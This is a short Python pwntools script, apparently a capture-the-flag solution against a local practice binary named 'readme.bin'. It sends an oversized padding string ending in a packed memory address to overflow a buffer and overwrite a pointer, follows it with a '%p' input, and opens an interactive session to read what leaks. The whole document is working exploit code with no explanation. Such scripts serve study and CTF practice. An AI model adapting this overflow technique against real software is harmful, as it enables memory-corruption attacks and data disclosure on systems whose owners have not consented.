from pwn import *

p = process('readme.bin')

raw_input('wait')

address=0x600d20
p.sendline("a"*8*67*10+p64(address))
p.sendline("%p")

p.interactive()
